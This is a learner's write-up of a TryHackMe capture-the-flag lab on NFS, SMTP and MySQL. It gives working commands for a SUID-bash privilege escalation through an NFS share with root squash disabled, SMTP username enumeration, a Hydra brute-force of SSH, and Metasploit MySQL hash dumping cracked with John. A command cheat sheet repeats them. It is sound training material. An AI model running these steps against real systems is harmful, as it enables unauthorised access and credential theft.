# 🛡️ TryHackMe — Network Services 2 (Room 2)

> **Platform:** TryHackMe
> **Room Name:** `Network Services 2`
> **Category:** Enumeration & Exploitation of Common Network Services
> **Skills Covered:** NFS, SMTP, MySQL — Enumeration, Exploitation & Privilege Escalation

---

## 📌 Room Overview

This write-up documents my walkthrough of the **Network Services 2** room on TryHackMe, which builds on the fundamentals from Network Services (Room 1) and dives into three more critical services:

| Service | Default Port(s) | Protocol |
|---------|------------------|----------|
| **NFS** (Network File System) | 2049 | TCP/UDP (RPC) |
| **SMTP** (Simple Mail Transfer Protocol) | 25 (587/465 for encrypted) | TCP |
| **MySQL** (RDBMS) | 3306 | TCP |

The goal was to enumerate each service, identify misconfigurations, extract credentials/hashes, and escalate privileges — ultimately gaining root access and cracking database credentials.

---

## 🗄️ 1. NFS (Network File System)

**Default Port:** `2049`

NFS uses **RPC (Remote Procedure Call)** protocol and provides a file handle when a client requests mounting, along with a unique **UID** and **GID**.

### 🔧 Installation & Enumeration

```bash
sudo apt install nfs-common
```

```bash
showmount -e <ipaddress>
```
> Shows the exported/shared directories available on the NFS server.

### 📂 Mounting the Share

```bash
mkdir /tmp/mount
sudo mount -t nfs IP:share /tmp/mount/ -o nolock
```
> Creates a local mount point and mounts the remote NFS share to it.

### 🔓 Understanding Root Squash

- If we access the NFS share as a **root user** from our local machine, the NFS server **does not** treat that access as root — it's downgraded to a **low-privilege user**. This protective mechanism is called **Root Squash**.
- If **Root Squash is disabled**, we can regain root access by setting the **SUID permission bit** on an executable file (like `bash`).

### ⚔️ Exploitation — Privilege Escalation via SUID

```bash
scp -i /home/uzair1453/Downloads/id_rsa cappucino@10.113.169.220:/bin/bash ~/Downloads/bash
```
> Copy the target's bash binary to your local system.

```bash
chmod u+s "bash file"
```
> Adds the **SUID permission bit**, allowing us to execute the file as root (since we own it locally).

Then copy this modified `bash` file back onto the target NFS share (owned by root), log back in as the low-privilege user (`cappucino`), and run:

```bash
whoami
```
> ✅ If the response is `root`, privilege escalation was successful!

> ⚠️ **Important:** Always verify with `chmod u+s` that the SUID bit was actually applied before testing — a common troubleshooting step.

---

## 📧 2. SMTP (Simple Mail Transfer Protocol)

**Default Port:** `25` *(Encrypted/secure setups commonly use port `587` or `465`)*

SMTP is used only for **sending/outgoing mail** — receiving mail is handled by other protocols.

### 📊 Protocol Roles

| Protocol | Function |
|----------|----------|
| **SMTP** | Sends outgoing mail (when you hit "Send" on an email) |
| **POP/IMAP** | Retrieves incoming mail (when you check your inbox) |

| Protocol | How It Works |
|----------|---------------|
| **POP** (Post Office Protocol) | Downloads the **entire inbox** to your local machine — simple, one-way approach |
| **IMAP** (Internet Message Access Protocol) | **Synchronizes** with the server — only new mail is downloaded, everything stays in sync |

### 📬 Email Flow

1. User sends email via an email client/**Mail Transfer Agent (MTA)** like Gmail or Outlook.
2. The client connects to the **SMTP server** (SMTP handshake).
3. That SMTP server relays the email to the **receiver's SMTP server**.
4. The receiver's server uses **IMAP/POP** to deliver the email to the receiver's inbox (e.g., Gmail).

### 🔍 Enumeration with Metasploit

```bash
search smtp_version
```
> Gathers version/banner information about the SMTP server.

```bash
search smtp_enum
```
> Enumerates valid usernames on the target SMTP server.

### 🔑 Exploitation — Brute Force & SSH Login

```bash
hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.112.151.137 ssh
```
> Once a valid username is found via SMTP enumeration, brute-force the password using Hydra against SSH.

```bash
ssh username@ipaddress
```
> Log in using the cracked credentials.

---

## 🗃️ 3. MySQL (RDBMS)

**Default Port:** `3306`

MySQL is a **client-server** based RDBMS (Relational Database Management System) that uses **SQL (Structured Query Language)** to communicate with the database for deleting, editing, selecting, saving, etc.

### 🔄 How MySQL Works — 3 Stages

| Stage | Description |
|-------|--------------|
| **1. Database Creation** | Server creates a database where data is stored/manipulated, and tables are defined and related to each other. |
| **2. Client Requests** | Client sends specific SQL statements to the server (e.g., "add this record", "delete that record"). |
| **3. Server Response** | Server processes the request and sends back the requested information/data. |

**Simple Flow:**
```
Client (sends SQL statement) → Server (processes it) → Response (data returned)
```

### 🧱 LAMP Stack — Important Concept

MySQL is a core part of the famous **LAMP Stack**:

| Letter | Meaning |
|--------|---------|
| **L** | Linux (Operating System) |
| **A** | Apache (Web Server Software) |
| **M** | MySQL (Database) |
| **P** | PHP (Backend Programming Language) |

> These 4 technologies combine to form a complete website backend — many websites (like WordPress) run on this exact stack.

### 🔍 Enumeration & Exploitation

MySQL is not usually the first target — without credentials, it's not worth attacking directly. We first exploit other services (SMB/FTP/SMTP etc.) to get usernames/passwords, then use them here.

```bash
sudo apt install default-mysql-client
```
> Installs the MySQL client to connect to remote MySQL servers from our local machine.

```bash
mysql -h 10.112.131.108 --ssl=0 -u root -p
```
> Connects to the remote server, disabling SSL/TLS for a non-encrypted connection (useful in CTF-style boxes).

### 💥 Using Metasploit for MySQL

```bash
msfconsole
search mysql_sql
set username / password / rhosts
```

```bash
search mysql_schemadump
```
> Shows how many databases are running on the server and lists their tables.

```bash
search mysql_hashdump
```
> Extracts usernames along with their password hashes.

Example extracted hash:
```
carl:*EA031893AA21444B170FC2162A56978B8CEECE18
```

Save this to a file (e.g. `hash.txt`) using a text editor like `nano`.

### 🔓 Cracking the Hash

```bash
john hash.txt
```
> Uses **John the Ripper** to crack the password from the extracted hash.

---

## ⚡ Quick Revision — Command Cheat Sheet

| Purpose | Command |
|---------|---------|
| Show NFS shares | `showmount -e <ip>` |
| Mount NFS share | `sudo mount -t nfs IP:share /tmp/mount/ -o nolock` |
| Copy binary via SCP | `scp -i id_rsa <user>@<ip>:/bin/bash ~/Downloads/bash` |
| Set SUID bit | `chmod u+s "bash file"` |
| Check privilege level | `whoami` |
| SMTP version enum (Metasploit) | `search smtp_version` |
| SMTP username enum (Metasploit) | `search smtp_enum` |
| Brute-force SSH creds | `hydra -t 16 -l <user> -P rockyou.txt -vV <ip> ssh` |
| SSH login | `ssh username@ipaddress` |
| Install MySQL client | `sudo apt install default-mysql-client` |
| Connect to remote MySQL | `mysql -h <ip> --ssl=0 -u root -p` |
| Dump MySQL schema (Metasploit) | `search mysql_schemadump` |
| Dump MySQL hashes (Metasploit) | `search mysql_hashdump` |
| Crack password hash | `john hash.txt` |

---

## 🧠 Key Concepts to Remember

- ✅ **NFS (2049)** → RPC-based file sharing; watch for **disabled Root Squash** to escalate privileges via SUID.
- ✅ **SMTP (25/587/465)** → Only sends mail; enumerate usernames, then brute-force other services (like SSH) with them.
- ✅ **MySQL (3306)** → Rarely the first target; exploit it **after** gathering credentials from other services. Core part of the **LAMP stack**.
- ✅ Always chain enumeration → found credentials/keys/hashes → gain shell access → escalate privileges.
- ✅ Misconfigured NFS exports, weak SMTP username disclosure, and exposed MySQL databases are common real-world findings.

---

## 🏁 Conclusion

This room strengthened my understanding of enumerating and exploiting NFS, SMTP, and MySQL services — including privilege escalation via SUID/Root Squash misconfigurations, SMTP username enumeration, and cracking database hashes with tools like `Metasploit`, `Hydra`, and `John the Ripper`.

---

📌 *Room completed on [TryHackMe](https://tryhackme.com) — Network Services 2*
✍️ Write-up by **[Your Name]**
